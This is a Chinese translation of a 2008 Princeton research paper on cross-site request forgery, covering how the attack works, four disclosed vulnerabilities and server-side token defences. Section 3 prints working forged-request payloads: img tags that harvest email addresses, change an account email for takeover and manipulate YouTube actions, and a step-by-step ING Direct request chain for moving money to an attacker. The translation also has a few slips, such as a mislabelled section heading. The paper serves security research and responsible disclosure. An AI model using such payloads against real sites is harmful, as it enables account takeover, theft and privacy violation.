# <center><font size=6> <b>跨站请求伪造：剥削和预防</b> </center> </font>
<center>WilliamZeller⋆和EdwardW.Felten⋆†</center>
<center>⋆计算机科学系</center>
<center>⋆信息技术政策中心</center>
<center>†伍德罗威尔逊普林斯顿大学公共和国际事务学院</center>
<center>{wzeller，felten} @ cs.princeton.edu</center>


<font size=3><b>&emsp;&emsp;修订版10/15/2008：</b></font>
<font size=3>注意到“纽约时报”已修复下述漏洞。 还澄清了我们的服务器端CSRF保护建议不能阻止[17]中描述的主动网络攻击。</font>

<font size=3> &emsp;&emsp;本文的最新版本可以在以下位置找到
http://citp.princeton.edu/csrf/</font>
<br>
<br>
<br>
<br>
<font size=5><b>摘要</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;跨站点请求伪造（CSRF）攻击通常是指用户在web浏览器访问受信任的站点时执行了由恶意网站引起不需要的操作。这种攻击被称为基于web漏洞的“沉睡巨人”（Sleep giant），因为许多因特网的站点都难以实现防御抵制这种攻击，并且它们很大程度上被网络开发和安全社区忽略了。我们提出四种严重的CSRF漏洞，我们在四个主要网站上发现了这些漏洞，包括我们认为首次发布的涉及金融机构的攻击。这些漏洞导致攻击者可把财产资金转移出用户的银行账户，获取用户的邮件地址，侵犯窃取用户的隐私信息甚至危害用户账号。我们建议能够完全保护站点免受CSRF攻击的服务器端更改（我们已实施）。我们同样也描述了服务器端解决方案应具备的功能（缺少这些功能导致CSRF保护不必要地破坏典型的Web浏览行为）。另外，我们已经实现了一种客户端浏览器的插件，即使站点没有采取措施保护自己，也可以保护用户免受某些类型的CSRF攻击。我们希望引起对CSRF攻击的警觉，同时也希望为负责任的Web开发人员提供保护用户免受这些攻击的工具。</font>
<br>
<br>
<br>
<br>
<font size=5><b>1&emsp;介绍</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;跨站点请求伪造（CSRF）攻击通常是指用户在web浏览器访问受信任的站点时执行了由恶意网站引起不需要的操作。这种攻击被称为基于web漏洞的“沉睡巨人”（Sleep giant），因为许多因特网的站点都难以实现防御抵制这种攻击，并且它们很大程度上被忽略了。CSRF攻击没有出现在Web Security Threat Classification[12]（Web安全威胁分类）中，同样也很少被在学术或者技术期刊报告中讨论，但却是易于利用易于修复。这些攻击存在因为通常网站开发人员都没有受过关于CFSR攻击的引起原因和严重性的专业知识培训。很多Web开发人员或许处于一种对于CSRF攻击的错误认知中，他们认为对于更著名的跨站点跟踪（XSS）的防御措施同样能够抵御CSRF攻击。</font>
<br>
<font size=3>&emsp;&emsp;在章节3，我们提出四种严重的CSRF漏洞，我们在四个主要网站上发现了这些漏洞，包括我们认为首次发布的涉及金融机构的攻击。这些漏洞导致攻击者可把财产资金转移出用户的银行账户，获取用户的邮件地址，侵犯窃取用户的隐私信息甚至危害用户账号。</font>
<br>
<font size=3>&emsp;&emsp;在章节4.1，我们建议能够完全保护站点免受CSRF攻击的服务器端更改（我们已实施）。这些推荐建议优于许多之前已经提出的解决方案，因为这些建议不需要服务器状态，也不会破坏典型的web网页浏览行为。另外，我们已经实现了一种客户端浏览器插件可以防止用户遭受某些类型的CSRF攻击（章节4.2）。服务器端保护允许站点完全保护自己免受CSRF攻击，而客户端保护允许用户采取主动措施来保护自己免受多种类型的CSRF攻击，即使站点没有采取措施保护自己。 我们希望提高对CSRF攻击的认识，同时为负责任的Web开发人员提供保护用户免受这些攻击的工具。</font>
<br>
<br>
<br>
<br>
<font size=5><b>2&emsp;CSFR概述</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;图1,2和3显示了CSRF攻击通常如何工作。</font>
<br>
<font size=3>&emsp;&emsp;下面我们使用一个具体的例子更详细地描述CSRF攻击。</font>
<br>
<br>
<font size=4><b>2.1&emsp;引例</b></font>
<br>
<font size=3>&emsp;&emsp;让我们考虑一个网站漏洞导致CSRF攻击的假设示例。此站点是基于Web的允许用户发送和接收电子邮件的电子邮件站点。这个网站使用隐藏认证方式认证其用户身份。http://example.com/compose. htm这个html页面，包含允许一个用户输入收信人的email地址、主题和信息的HTML表单和“SendEmail”按钮</font>

```
<form
action="http://example.com/send_email.htm"
method="GET">
Recipient’s Email address:  <input
type="text" name="to">
Subject:  <input type="text" name="subject">
Message:  <textarea name="msg"></textarea>
<input type="submit" value="Send Email">
</form>
```
<br>
<font size=3>&emsp;&emsp;当example.com的用户点击“Send Email”时，他输入的数据将会作为GET请求被发送到 http://example.com/ send_email.htm 。由于GET请求只是将表单数据附加到URL，因此用户将被发送到以下URL（假设该用户输入“bob@example.com”作为收件人，主题是“Hello”，内容是“那个提议的进展怎样？”）：</font>

```
http://example.com/send_email.htm?to=bob% 40example.com&subject=hello&msg=What%27s+the+ status+of+that+proposal%3F 3
```
<br>
<font size=3>&emsp;&emsp;页面发送email.htm将获取其收到的数据并从用户向收件人发送电子邮件。请注意，发送email.htm只需获取数据并对该数据执行操作。它并不会追踪请求来源，只关注请求信息本身的内容。这意味着如果用户在浏览器上手工输入以上URL，example.com依旧会发送一封邮件。例如，如果用户在浏览器中输入以下三个URL，发送email.htm将会发送三封电子邮件（一封发送给Bob,一封发送给Alice，一封发送给Carol）：</font>

```
http://example.com/send_email.htm?to=bob%
40example.com&subject=hi+Bob&msg=test
http://example.com/send_email.htm?to=alice%
40example.com&subject=hi+Alice&msg=test
http://example.com/send_email.htm?to=carol%
40example.com&subject=hi+Carol&msg=test
```
<br>
<font size=3>&emsp;&emsp;在这种情况下CSRF攻击就有可能发生，因为发送eamil.htm包含收到它接受到的任何数据并且会发送一封电子邮件。它不会验证信息来自于compose.htm的表单，因此，如果攻击者能够引诱用户给发送email.htm发送一个请求，那么这个页面就会使example.com以用户身份发送一封包含所有攻击者选择数据的电子邮件，这样攻击者就会成功实现CSRF攻击。</font>
<br>
<font size=3>&emsp;&emsp;要利用这种脆弱性，攻击者需要强制用户浏览器给发送email.htm发送一个请求从而执行一些恶意操作。（我们假定用户浏览一个处于攻击者控制下的网站，并且目标网站并不能抵御CSFR攻击）具体而言，攻击者需要从他的站点向example.com伪造跨站点请求。不幸的是，HTML提供许多生成这种请求的方式。例如，<img>标记将导致浏览器加载任何URI作为src属性，即使该URI不是图像（因为浏览器只能在加载后告诉URI是图像）。 攻击者可以使用以下代码创建页面：</font>

```
<img src="http://example.com/send_email.htm?
to=mallory%40example.com&subject=Hi&msg=My+
email+address+has+been+stolen">
```
<br>
<font size=3>&emsp;&emsp;当用户访问该页面时，一个请求将会被发送到发送email.htm，然后发送 email.htm就会从用户端给Mallory发送一封邮件。这个例子与将要在章节3.1描述的我们在纽约时报网站上发现的实际漏洞相同。</font>
<br>
<font size=3>&emsp;&emsp;当一个攻击者能够使用户浏览器执行链接到另外一个网站的无意行为时，CSRF攻击就成功实现了。要使此操作成功，用户必须能够执行此操作。CSRF攻击的危害性大小通常取决于一个用户的权限大小，这意味着用户能够执行的任何操作都可以被一个攻击者用一种CSRF攻击实现。因此，网站给用户的权限越高，遭受CSFR攻击的可能性越大。</font>
<br>
<font size=3>&emsp;&emsp;CSRF攻击能够被几乎任何使用隐式认证并且没有明确采取防御CSRF攻击的网站抵御（参考章节2.2）。</font>
<br>
<font size=3>&emsp;&emsp;同源策略（请参阅附录B）旨在防止攻击者访问第三方站点上的数据。这种策略没阻止发送请求，它仅仅阻止攻击者读取从第三方服务器返回的数据。因为CSRF攻击是请求发送的结果，所以同源策略并不能防御CSRF攻击。</font>

![](/翻译大作业/images/pic1.jpg)

<br>
<font size=3> 图1：此处，Web浏览器已与可信站点建立了经过身份验证的会话。 只有在Web浏览器通过身份验证的会话发出请求时，才应执行“受信任的操作”。</font>

![](/翻译大作业/images/pic2.jpg)

<br>
<font size=3> 图2：有效请求。 Web浏览器尝试执行可信操作。 可信站点确认Web浏览器已通过身份验证，并允许执行操作。</font>

![](/翻译大作业/images/pic3.jpg)

<br>
<font size=3> 图3：CSRF攻击。 攻击站点使浏览器向可信站点发送请求。 可信站点从Web浏览器中查看有效的，经过身份验证的请求，并执行可信操作。 CSRF攻击是可能的，因为网站对Web浏览器进行身份验证，而不是用户。</font>
<br>
<br>

<font size=4><b>2.2&emsp;认证和CSRF</b></font>
<br>
<font size=3>&emsp;&emsp;CSRF攻击通常利用目标网站的身份验证机制。问题的根源是Web认证通常只确认某个网站请求来自于特定用户的浏览器，却不会确认用户实际请求是什么或者认证请求。</font>
<br>
<font size=3>&emsp;&emsp;例如，假设Alice访问一个目标站点T。网站T为了跟踪用户Alice的会话，给Alice的浏览器一个包含一个伪随机检查标识符sid的cookie。Alice被要求登录该站点，并在输入有效的用户名和密码后，该站点把Alice已经登录的状态记录到会话sid标识符。当Alice给网站T发送请求，她的浏览器会自动发送包含sid标识符的会话cookie，然后T使用其记录将会话标识为来自Alice。</font>
<br>
<font size=3>&emsp;&emsp;现在假想Alice访问一个恶意站点M。由M提供的内容包含Javascript代码或图像标记，导致Alice的浏览器向T发送HTTP请求。 因为请求将要发送给站点T，Alice的浏览器“完全帮助”将会话cookie中的标识符sid附加在请求中。网站T一旦看到请求，就会通过cookie包含存在的信息来确认请求来自于用户ALice，因此网站T才能在Alice的账户执行被请求的操作。这就是一个成功的CSRF攻击例子。</font>
<br>
<font size=3>&emsp;&emsp;其他Web网站的大部分认证机制会存在同样的问题。例如，HTTP请求基本认证机制[22]会要求用户Alice告知她的浏览器登录网站T的用户名和密码，然后浏览器会“帮助系统“将用户名和密码附加在未来发送给站点T的请求中。或者（作为一种选择），网站T会使用用户端SSL认证证书，但是相同的问题将会产生，因为浏览器会“帮助”使用证书去执行发送给站点T的请求，同时，如果站点T通过她的IP地址认证Alice，CSRF攻击就可能发生。</font>
<br>
<font size=3>&emsp;&emsp;通常情况下，无论请求被发送的目标网站和请求来自的存在CSRF攻击的浏览器引起的隐藏认证何时发生，都有发生CSRF攻击的危险。原则上，这种危险可以通过要求用户对于每一个发送到网站的请求采用明确的，不会被嗅探的行为避免，但是实践中这将会引起主要可使性问题。最标准的和最为广泛使用的认证机制未能抵御CSRF攻击，因此必须在其他地方寻求切实可行的解决方案。</font>
<br>
<br>
<font size=4><b>2.3&emsp;CSRF攻击向量</b></font>
<br>
<font size=3>&emsp;&emsp;要使攻击成功，用户必须登录到目标站点，并且必须访问攻击者的站点或攻击者可以部分控制的站点。
<br>
<font size=3>&emsp;&emsp;如果服务器包含CSRF漏洞并且还接受GET请求（如上例所示），则可以在不使用JavaScript的情况下进行CSRF攻击（例如，可以使用简单的<img>标记）。如果服务器只接受POST请求，则需要JavaScript自动从攻击者的站点向目标站点发送POST请求。
<br>
<br>
<font size=4><b>2.4&emsp;CSRF与XSS</b></font>
<br>
<font size=3>&emsp;&emsp;最近，跨站点脚本（XSS）[20]漏洞受到了很多关注。当攻击者以攻击站点的其他用户为目标时将恶意代码（通常是JavaScript）注入该站点，就会发生XSS攻击。例如，网站可能允许用户发表评论。这些注释被用户提交，存储在数据库中并显示给站点的所有未来用户。如果攻击者能够在评论中插入恶意JavaScript，则JavaScript将嵌入到包含评论的任何页面中。当用户访问该站点时，攻击者的JavaScript将以目标站点的所有权限执行。嵌入目标站点的恶意JavaScript将能够从站点上的任何页面发送和接收请求，并访问该站点设置的cookie。防止XSS攻击需要站点仔细过滤任何用户输入，以确保不会注入恶意代码。</font>
<br>
<font size=3>&emsp;&emsp;CSRF和XSS攻击的不同之处在于XSS攻击需要JavaScript，而CSRF攻击则不需要。 XSS攻击要求站点接受恶意代码，而使用CSRF攻击时，恶意代码位于第三方站点上。过滤用户输入将阻止恶意代码在特定站点上运行，但不会阻止恶意代码在第三方站点上运行。由于恶意代码可以在第三方站点上运行，因此防止XSS攻击不能保护站点免受CSRF攻击。如果一个站点易受XSS攻击，那么它很容易受到CSRF的攻击。如果站点完全受到XSS攻击的保护，则很可能仍然容易受到CSRF攻击。</font>
<br>
<br>
<br>
<br>
<font size=5><b>3&emsp;CSRF漏洞</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;在这一章节我们描述我们已经发现的四种漏斗。这些攻击是在调查十大受欢迎网站时发现的。我们分析的许多这些网站中都有过CSRF漏洞或者漏洞历史（例如，一份网络搜索会显示已经被修复的CSRF漏洞报告）事实上，在第三方披露问题之前，如此多的网站容易遭受CSRF攻击，这表明许多网站管理员缺失CSRF漏洞的风险和存在的专业知识。</font>
<br>
<font size=3>&emsp;&emsp;我们相信ING Direct、Metafilter 、YouTube, 和 纽约时报已将修补了我们下面描述的这些漏洞。所有这四个站点似乎都已经运用类似于我们在章节4.1提出的方法修复了这个问题。</font>
<br>
<br>
<font size=4><b>3.1&emsp;纽约时报</b></font>
<br>
<center><font size=2> 
“纽约时报”网站是“网络上排名第一的报纸网站”[10]。</font></center>
<br>
<font size=3>&emsp;&emsp;我们在NYTimes.com发现了一种能够使用户email地址被攻击者获取的CSRF漏洞，如果你是在NYTimes.co的一个成员，任意的站点都可以利用这种攻击去确定你的email地址并且利用它去发送一个
垃圾邮件或者去鉴定你的身份。</font>
<br>
<font size=3>&emsp;&emsp;这种攻击充分利用了 NYTimes.com’s “Email This”特征。“Email This”是一个工具，它允许用户通过指定接收者email地址或可选择的个人信息来给一篇NYTimes.com的文章发送一个链接。接收者收到一封如下所示的邮件：</font>

```
本页面由以下人员发送给您：[用户的电子邮件地址]
发件人留言：
以为你会对此感兴趣。
国家办公桌
研究人员找到窃取加密数据的方法
作者：JOHN MARKOFF
一个计算机安全研究小组
开发了一种窃取加密的方法
来自计算机硬盘的信息。
```
<br>
<font size=3>&emsp;&emsp;为了利用这种漏洞，攻击者会引诱登录用户的浏览器向NY- Times.com 的“Email This” 页面发送一个请求。接受“Email This”请求的页面不能抵御CSRF攻击，因此用户的浏览器将会引起向NYTimes.com发送请求，该请求会触发这个页面向攻击人选择的地址发送一封邮件。如果攻击者把电子邮件接受者的地址替换为他自己的email地址，他将接收一封来自NYTimes.com 的包含用户email地址的电子邮件。</font>
<br>
<font size=3>&emsp;&emsp;利用这种漏洞非常简单，NYTimes.com的每篇文章都包含一个链接到“Email This” 页面的链接，其中包含一个用户输入接收者email地址的表单。这个表单同样包含对每篇文章的唯一隐藏变量。以下是一个示例表单:</font>

```
<form 
action="http://www.nytimes.com/mem/emailthis.html" method="POST" enctype="application/x-www-form-urlencoded"> <input type="checkbox" id="copytoself" name="copytoself" value="Y">
<input id="recipients" name="recipients" type="text" maxlength="1320" value="">
<input type="hidden" name="state" value="1"> <textarea id="message" name="personalnote" maxlength="512"></textarea>
<input type="hidden" name="type" value="1">
<input type="hidden" name="url"
value="[...]">
<input type="hidden" name="title" value="[...]">
<input type="hidden" name="description" value="[...]">
...
</form>
```
<br>
<font size=3>&emsp;&emsp;因为NYTimes.com不能区分GET请求和POST请求，攻击者可以将这个表单转换为一个GET请求，这个请求之后会被应用在<img>标签中。把表单转换为一个GET请求中涉及把每个参数附加到URL的查询字符串中（格式：NAME=VALUE，用符号&分隔）。</font>
<br>
<font size=3>&emsp;&emsp;一旦攻击者重构了URL，他就能将它设置为<img>标签的SRC属性。如果NYTimes.com 的登录用户访问包含该<img>标签的任何页面，浏览器就会加载携带攻击者参数的“Email This”页面，致使NYTimes.com向攻击者发送一封包含用户的email地址的邮件。攻击者可以把用户的email地址存储起来以便之后滥用（例如，发送垃圾邮件）或者使用email地址来识别它自己站点的访问者。这会引起严重的隐私问题，比如允许有争议的网站（例如，政治或非法）的运营商识别其用户。</font>
<br>
<font size=3>&emsp;&emsp;我们在Firefox 2.0.0.6, Opera 9.23和Safari 3.0.3 (522.15.5)测试这种攻击。由于在附录A描述的原因在Internet
Explorer中并不生效。我们在2007年9月向纽约时报通报了此漏洞。到2008年10月1日这个漏洞已经被修复。</font>
<br>
<br>
<font size=4><b>3.2&emsp;ING Direct (ingdirect.com)</b></font>
<br>
<br>
<center><font size=2> 
“ING Direct是美国第四大储蓄银行，拥有超过620亿资产，为超过410万用户提供卓越储蓄和抵押服务 ”[15]</font></center>
<br>
<font size=3>&emsp;&emsp;我们在ING网站发现CSRF漏洞，这种漏洞允许攻击者代表用户开设其他账户，并且从用户账户转移资金到攻击者账户。正如我们在章节2.2讨论的那样，ING使用SSL并不能抵御这种攻击。我们认为这是第一个被公布的涉及金融机构的CSRF攻击。</font>
<br>
<font size=3>&emsp;&emsp;因为ING不能明确抵御这种CSRF攻击，所以从用户账户转移资产和模仿用户在转移资产时所采取的步骤一样简单。这些步骤包含下列操作。</font>
<br>
<font size=3>&emsp;&emsp;1.攻击者代表用户创建一个支票账户。4</font>
<br>
<font size=3>&emsp;&emsp;&emsp;（a）攻击者使用户浏览器访问ING的“开设新账户”页面：</font>

<font size=2>&emsp;&emsp;&emsp;&emsp;
• 一个GET请求发送到 https://secure. ingdirect.com/myaccount/ INGDirect.html?command= gotoOpenOCA</font>
<br>
<font size=3>&emsp;&emsp;&emsp;（b）攻击者使用户浏览器输入攻击者的信息：</font>

<font size=2>&emsp;&emsp;&emsp;&emsp;
• 一个POST请求发送到 https://secure. ingdirect.com/myaccount/ INGDirect.html 带有以下参数:</font>

```
command=ocaOpenInitial&YES, I
WANT TO CONTINUE..x=44&YES, I
WANT TO CONTINUE..y=25
```

<br>
<font size=3>&emsp;&emsp;&emsp;（c）攻击者选择资金的仲裁金额，最初从用户的储蓄账户转移到新的欺诈账户：</font>

<font size=2>&emsp;&emsp;&emsp;&emsp;
• 一个POST请求发送到 https://secure.
ingdirect.com/myaccount/ INGDirect.html带有以下参数:</font>

```
command=ocaValidateFunding&PRIMARY CARD=true&JOINTCARD=true&Account Nickname=[ACCOUNT NAME]&FROMACCT= 0&TAMT=[INITIAL AMOUNT]&YES, I WANT TO CONTINUE..x=44&YES, I
WANT TO
CONTINUE..y=25&XTYPE=4000USD
&XBCRCD=USD……
……其中[帐户名]是用户将看到的帐户的名称，[INITIAL AMOUNT]是打开时将转移到新帐户的金额。 帐户名称可以是任何字符串，攻击者无需事先知道它 - 它只是一个将用于新帐户的昵称。

```
<br>
<font size=3>&emsp;&emsp;&emsp;（d）攻击者使用户浏览器点击最后的“开通账户”按钮，使ING代表用户开设一个新的支票：</font>

<font size=2>&emsp;&emsp;&emsp;&emsp;
• 一个POST请求发送到https://secure. ingdirect.com/myaccount/ INGDirect.html带有以下参数：</font>

```
command=ocaOpenAccount&Agree
ElectronicDisclosure=yes&AgreeTerms
Conditions=yes&YES, I WANT TO
CONTINUE..x=44&YES, I WANT TO
CONTINUE..y=25&YES, I WANT TO
CONTINUE.=Submit

```
<br>
<font size=3>&emsp;&emsp;2.攻击者将自己添加为用户账户收款人。</font>
<br>
<font size=3>&emsp;&emsp;&emsp;（a）攻击者使用户的浏览器访问ING的“添加人员”页面：</font>

<font size=2>&emsp;&emsp;&emsp;&emsp;
• 一个GET请求发送到https://secure. ingdirect.com/myaccount/ INGDirect.html?command= goToModifyPersonalPayee&Mode= Add&from=displayEmailMoney</font>
<br>
<font size=3>&emsp;&emsp;&emsp;（b）攻击者使用户浏览器输入攻击者的信息：</font>

<font size=2>&emsp;&emsp;&emsp;&emsp;
• 一个POST请求发送到https://secure. ingdirect.com/myaccount/ INGDirect.html 带有以下参数：</font>

```
command=validateModifyPersonalPayee &from=displayEmailMoney&PayeeName =[PAYEE NAME]&PayeeNickname=&chk Email=on&PayeeEmail=[PAYEE EMAIL] &PayeeIsEmailToOrange=true&Payee OrangeAccount=[PAYEE ACCOUNT NUM]& YES, I WANT TO CONTINUE..x=44
&YES, I WANT TO CONTINUE..y=25

…其中[PAYEE NAME]是攻击者的名字，[PAYEE EMAIL]是攻击者的电子邮件地址，[PAYEE ACCOUNT NUM]是攻击者的ING帐号。
```
<br>
<font size=3>&emsp;&emsp;&emsp;（c）攻击者使用户浏览器确认攻击者是有效的收款人账户：</font>
<font size=2>&emsp;&emsp;&emsp;&emsp;
• 一个POST请求给 https://secure.
ingdirect.com/myaccount/ INGDirect.html 带着以下参数:</font>

```
command=modifyPersonalPayee&from=
displayEmailMoney&YES, I WANT TO
CONTINUE..x=44 &YES, I WANT TO
CONTINUE..y=25

```
<br>
<font size=3>&emsp;&emsp;3.攻击者从用户账户转移资金到自己的账户。</font>
<br>
<font size=3>&emsp;&emsp;&emsp;（a）攻击者使用户的浏览器输入一定数量的钱发送给攻击者：</font>

<font size=2>&emsp;&emsp;&emsp;&emsp;
• 一个POST请求发送到 https://secure. ingdirect.com/myaccount/ INGDirect.html带有以下参数:</font>

```
command=validateEmailMoney&CNSPayID =5000&Amount=[TRANSFER AMOUNT] &Comments=[TRANSFER MESSAGE]&YES,
I WANT TO CONTINUE..x=44 &YES, I WANT TO CONTINUE..y=25&show=1&button=Send Money

...其中[TRANSFER AMOUNT]是从用户帐户转移到攻击者帐户的金额，[TRANSFER MESSAGE]是要包含在交易中的消息。
```
<br>
<font size=3>&emsp;&emsp;&emsp;（b）攻击者使用户浏览器确认钱确实被转移到自己账户：</font>
<font size=2>&emsp;&emsp;&emsp;&emsp;
• 一个POST请求发送到https://secure. ingdirect.com/myaccount/ INGDirect.html带有以下参数：</font>

```
command=emailMoney&Amount= [TRANSFER AMOUNT]Comments= [TRANSFER MESSAGE]&YES, I WANT TO CONTINUE..x=44&YES, I WANT TO CONTINUE..y=25

… 其中[TRANSFER AMOUNT]和[TRANSFER MESSAGE]的值与上面的3（a）相同。
```
<br>
<font size=3>&emsp;&emsp;&emsp;要利用此攻击，攻击者将创建一个页面，使用JavaScript连续发出上述POST请求。 这对用户来说是不可见的。</font>
<br>
<font size=3>&emsp;&emsp;&emsp;这种攻击假设用户还未他的ING Direct支票账户添加额外的收款人。如果没有这种限制，攻击很有可能已经被修改。</font>
<br>
<font size=3>&emsp;&emsp;&emsp;我们在Firefox 2.0.0.3和Internet Explorer 7.0.5试验了这种攻击。我们没有在其他浏览器测试这种攻击。我们告知了ING这种漏洞并且这种漏洞已经被修复。</font>
<br>
<br>
<font size=4><b>3.3&emsp;纽约时报</b></font>
<br>
<center><font size=2> 
“MetaFilter是一个博客…… 任何人都可以为添加链接或评论。"它目前每月有超过50,000名用户和350多万独立访问者[1]</font> 。</center>
<br>
<font size=3>&emsp;&emsp;我们在MetaFilter中发现了一个允许攻击者控制用户的帐户的CSRF漏洞。</font>
<br>
<font size=3>&emsp;&emsp;MetaFilter有一个“忘记密码”页面[6]，它允许用户请求获取他的密码。输入用户名会使MetaFilter将包含用户当前密码的电子邮件发送到与该用户关联的电子邮件地址。这意味着能够更改用户电子邮件地址的攻击者可以使用“丢失密码”页面来获取用户的密码，并使用该密码来控制用户的帐户。</font>
<br>
<font size=3>&emsp;&emsp;我们发现的CSRF攻击允许攻击者更改用户的电子邮件地址。要利用此攻击，攻击者会使用户的浏览器向用于更新用户个人资料的页面发送请求。此页面接受用户的电子邮件地址作为参数，可以用攻击者的地址替换。示例攻击是嵌入在页面上的以下HTML：</font>

```
<img src=" http://metafilter.com/contribute/customize_ action.cfm?user_email=[ATTACKER’S EMAIL]"/>
```
<br>
<font size=3>&emsp;&emsp;虽然这会更改任何已登录用户的电子邮件地址，但攻击者无法知道修改了哪个用户的帐户。 攻击者可以通过利用另一个MetaFilter功能来发现这一点，该功能允许用户将其他用户标记为“联系人”。攻击者可以使用类似上述的CSRF使用户在不知情的情况下将攻击者添加到他的联系人列表中。</font>
<br>
<font size=3>&emsp;&emsp;我们在Firefox。2.0.0.6中验证了此攻击。 因为存在附录A中描述的原因，所以它在Internet Explorer中不起作用。我们没有在其他浏览器中测试此攻击。 我们向MetaFilter报告了此漏洞，并确认它已在两天内修复。</font>
<br>
<br>
<font size=4><b>3.4&emsp; YouTube (youtube.com)</b></font>
<br>
<center><font size=2> 
“YouTube是在线视频的领导者，也是通过网络体验观看和分享全球原创视频的首选目的地”[13]。 2006年6月的一项研究发现，“YouTube仅占所有HTTP流量的大约20％，占互联网上所有流量的近10％。”[14]</font></center>
<br>
<font size=3>&emsp;&emsp;我们在用户可以在YouTube上执行的几乎所有操作中都发现了CSRF漏洞。 攻击者可以将视频添加到用户的“最喜爱收藏夹”中，将自己添加到用户的“朋友”或“家人”列表中，代表用户发送任意消息，将视频标记为不合适，自动与用户的联系人共享视频 ，将用户订阅到“频道”（由一个人或组发布的一组视频），并将视频添加到用户的“快捷列表”（用户打算稍后观看的视频列表）。 

例如，要将视频添加到用户的“最喜爱收藏夹”，攻击者只需在所有网站上嵌入此<img>标记即可：</font>

```
<img src="http://youtube.com/watch_ajax? action_add_favorite_playlist=1&video_ id=[VIDEO ID]&playlist_id=&add_to_favorite= 1&show=1&button=AddvideoasFavorite"/>
```
<br>
<font size=3>&emsp;&emsp;攻击者本可以利用此漏洞影响视频的热度。例如，将视频添加到足够数量的用户的“最喜爱收藏夹”会使YouTube在其“最热门收藏夹”中显示视频（一个视频“最喜欢”次数的列表）。除了增加视频的受欢迎程度之外，攻击者还可能导致用户在不知情的情况下将视频标记为不当，企图YouTube将其从网站中删除。</font>
<br>
<font size=3>&emsp;&emsp;这些攻击也可能被用来侵犯用户隐私。 YouTube允许用户仅向朋友或家人拍摄视频。这些攻击可能会让攻击者自动将自己添加到用户的“朋友”或“家人”列表中，这样他就可以访问用户上传的任何私人视频并限制在这些列表中。</font>
<br>
<font size=3>&emsp;&emsp;攻击者可以与用户的整个联系人列表（“朋友”，“家人”等）共享视频。 “共享”仅仅意味着发送附加了可选消息的视频的链接。此消息可以包含链接，这意味着攻击者可以强制用户包含指向包含攻击的站点的链接。收到该消息的用户可能会点击此链接，允许攻击以病毒传播。</font>
<br>
<font size=3>&emsp;&emsp;我们在Firefox 2.0.0.6中验证了这些攻击。由于附录A中描述的原因，它们无法在Internet Explorer中工作。我们没有在其他浏览器中测
试这些攻击。我们向YouTube报告了这些漏洞，并且它们已经得到纠正。</font>
<br>
<br>
<br>
<br>
<font size=5><b>4&emsp;防止CSRF</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;我们生成了两个可以保护大量用户免受CSRF攻击的工具。 第一个是服务器端工具，可以完全保护潜在的目标站点免受CSRF攻击。 第二种是客户端工具，可以保护用户免受某些类型的CSRF攻击。 表1详细描述了用户受这些不同技术保护的时间。 我们还建议应该成为服务器端解决方案一部分的功能。 这些建议优于之前已经提出的解决方案，因为它们不需要服务器状态并且不会破坏典型的Web浏览行为。</font>
<br>
<br>
<font size=4><b>4.1&emsp;服务器端保护</b></font>
<br>
<font size=3>&emsp;&emsp;注意：我们在下面假设攻击者无法修改与目标站点关联的用户cookie。除非攻击者是活跃的网络攻击者，否则同源策略可以保证这种情况。下面的解决方案不能抵御活跃的网络攻击者（更多细节见[17]）。</font>
<br>
<font size=3>&emsp;&emsp;最近，已经引入了许多框架，这些框架简化了各种语言的Web开发。例如Code Igniter [4]（PHP），Ruby on Rails [8]（Ruby），django [5]（Python），Catalyst [3]（Perl）和Struts [9]（Java）。这些框架的一个主要好处是CSRF保护可以直接构建到框架中，保护开发人员，同时使他们不需要自己实施保护。在框架层面实施的CSRF保护将受制于较大的疏忽，并且对CSRF的误解而引入错误的可能性降低低。</font>
<br>
<font size=3>&emsp;&emsp;通过采取以下预防措施，各个站点和框架可以保护自己免受CSRF攻击：</font>
<br>
<font size=3><b>&emsp;&emsp;1.允许GET请求仅检索数据,而不是修改服务器上的任何数据</b></font>

<font size=3>&emsp;&emsp;
此更改使用<img>标记或其他类型的GET请求保护站点免受CSRF攻击。 另外，这个建议遵循RFC 2616（HTTP / 1.1）：</font>
```
特别的，已经建立了GET和HEAD方法不应该具有采取除检索之外的行动的重要性的惯例。 这些方法应该被认为是“安全的”[21]。
```
<font size=3>&emsp;&emsp;虽然这种保护本身并不能阻止CSRF（因为攻击者可以使用POST请求），但它可以与（2）结合使用以完全防止CSRF漏洞5。</font>
<br>
<font size=3><b>&emsp;&emsp;2.要求所有POST请求都包含伪随机值</b></font>

<font size=3>&emsp;&emsp;当用户访问一个站点时，该站点应生成（加密强）伪随机值并将其设置为用户计算机上的一个cookie。该网站应要求每个表单提交包含这个伪随机值作为一项表单值以及一项cookie值。当POST请求发送到站点时，只有表单值和cookie值相同，则该请求被视为有效。当攻击者代表用户提交表单时，他只能修改表单的值。根据同源策略，攻击者无法读取从服务器发送的任何数据或修改cookie值（参见附录B）。这意味着虽然攻击者可以使用表单发送他想要的任何值，但他将无法修改或读取存储在cookie中的值。因为cookie值和表单值必须相同，除非攻击者能够猜测伪随机值。否则他将无法成功提交表单。</font>
<br>
<font size=3><b>&emsp;&emsp;3.使用独立于用户帐户的伪随机值与用户帐户关联伪随机值无法阻止[17]中描述的“登录CSRF”攻击。</b></font>

<font size=3>&emsp;&emsp;这种形式的服务器端保护具有以下特征：</font>

```
•轻量级。此解决方案不需要服务器端状态。站点唯一的责任是生成伪随机值（如果当前不存在）并在生成POST请求时比较两个值，使这种形式的CSRF保护计算成本低廉。

•并行会话兼容。如果用户在一个网站上有两种不同的表单，CSRF保护不应阻止他成功提交两种表单。考虑如果站点每次加载表单时都生成一个伪随机值，覆盖旧的伪随机值，会发生什么。用户只能成功提交他打开的最后一个表单，因为所有其他表单都包含无效的伪随机值。必须注意确保CSRF保护不会破坏分页式浏览或使用多个浏览器窗口浏览站点。这种解决方案通过设置站点范围的cookie并在一定时间内为所有表单使用相同的cookie来防止此问题。

•身份验证不可知。此解决方案不要求使用特定类型的身份验证。它适用于使用cookie会话，HTTP身份验证，SSL身份验证或IP地址对站点进行身份验证的站点。
```

![](/翻译大作业/images/table1.jpg)

<br>
<font size=2>
此表显示用户何时受到CSRF攻击并且未受到CSRF攻击的保护。 我们的服务器端建议可保护站点的每个用户。 当服务器需要使用POST请求时，我们的客户端浏览器插件可以保护用户。</font>
<br>
<br>
